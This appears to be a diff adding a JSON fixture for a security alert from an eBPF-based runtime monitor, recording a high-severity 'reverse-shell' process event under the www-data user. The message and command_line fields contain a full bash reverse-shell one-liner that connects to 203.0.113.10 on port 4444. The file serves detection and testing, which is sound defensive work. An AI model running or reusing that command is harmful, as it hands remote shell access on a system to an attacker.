@@ -1,0 +1,23 @@
+{
+  "agent_id": "agent-ubuntu-489394",
+  "hostname": "ubuntu",
+  "ip": "127.0.0.1",
+  "type": "runtime.process.new",
+  "severity": "high",
+  "strategy": "ebpf",
+  "backend": "ebpf-fallback",
+  "capability_status": "fallback",
+  "source_evidence": "process-delta-fallback",
+  "mode": "monitor",
+  "message": "New process detected: bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
+  "occurred_at": "2026-05-14T00:00:00Z",
+  "metadata": {
+    "collector": "process-delta-fallback",
+    "user": "www-data",
+    "process_name": "bash",
+    "command_line": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
+    "signal": "reverse-shell",
+    "runtime_enabled": true,
+    "source": "agent-runtime-monitor"
+  }
+}
